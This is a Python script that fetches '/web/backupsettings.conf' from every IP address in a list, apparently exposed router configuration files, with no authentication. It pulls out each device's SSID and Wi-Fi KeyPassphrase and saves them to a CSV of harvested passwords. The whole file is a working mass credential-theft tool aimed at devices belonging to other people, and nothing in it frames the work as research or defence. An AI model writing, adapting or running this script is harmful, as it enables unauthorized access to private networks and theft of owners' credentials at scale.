import requests
import os
import csv
import xml.etree.ElementTree as ET
import concurrent.futures
import re
import fileinput
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

directory_path = "./mini_xml"
output_file = "./csv/mini_pass.csv"

def remove_null_characters(dir):
    """Removes null characters from all XML files in a directory."""
    pattern = r"\x00"
    for filename in os.listdir(dir):
        if filename.endswith(".xml"):
            file_path = os.path.join(dir, filename)
            try:
                with fileinput.FileInput(file_path, inplace=True) as file:
                    for line in file:
                        cleaned_line = re.sub(pattern, "", line)
                        print(cleaned_line, end="")
                logging.info(f"Null characters removed from {filename}.")
            except Exception as e:
                logging.error(f"Error removing null characters from {filename}: {e}")

def download_backup_settings(ip):
    """Downloads the backup settings from a given IP address."""
    url = f"http://{ip}/web/backupsettings.conf"
    file_path = f"{directory_path}/{ip}.xml"
    try:
        response = requests.get(url, timeout=4)
        response.raise_for_status()
        with open(file_path, "wb") as file:
            file.write(response.content)
        logging.info(f"Downloaded backupsettings.conf from {ip} and saved as {file_path}")
        return file_path
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to download backupsettings.conf from {ip}: {e}")
        return None

def parse_xml_file(file_path, ip):
    """Parses an XML file and returns a list of (IP, SSID, KeyPassphrase) tuples."""
    ssid_key_pairs = []

    try:
        tree = ET.parse(file_path)
        root = tree.getroot()
    except ET.ParseError as e:
        logging.error(f"Failed to parse XML file {file_path}: {e}")
        return ssid_key_pairs

    ssid_elements = root.findall(".//SSID")
    keypassphrase_elements = root.findall(".//KeyPassphrase")

    if ssid_elements and keypassphrase_elements:
        ssid = ssid_elements[0].text

        for i in range(len(keypassphrase_elements) - 1):
            keypassphrase = keypassphrase_elements[i + 1].text
            ssid_key_pairs.append((ip, ssid, keypassphrase))

    return ssid_key_pairs

def read_ips_from_file(file_path):
    """Reads IP addresses from a file."""
    try:
        with open(file_path, "r") as file:
            return file.read().splitlines()
    except Exception as e:
        logging.error(f"Error reading IPs from file {file_path}: {e}")
        return []

def write_pairs_to_csv(pairs, file_path):
    """Writes a list of (IP, SSID, KeyPassphrase) tuples to a CSV file."""
    try:
        with open(file_path, "w", newline="") as file:
            writer = csv.writer(file)
            writer.writerow(["IP", "SSID", "KeyPassphrase"])
            writer.writerows(pairs)
        logging.info(f"Data written to CSV file {file_path}")
    except Exception as e:
        logging.error(f"Error writing to CSV file {file_path}: {e}")

def main():
    ips = read_ips_from_file("./ips/mini.txt")
    os.makedirs(directory_path, exist_ok=True)

    with concurrent.futures.ThreadPoolExecutor() as executor:
        downloaded_files = list(executor.map(download_backup_settings, ips))

    remove_null_characters(directory_path)

    pairs = []
    for ip, file_path in zip(ips, downloaded_files):
        if file_path is not None:
            pairs.extend(parse_xml_file(file_path, ip))

    write_pairs_to_csv(pairs, output_file)

if __name__ == "__main__":
    main()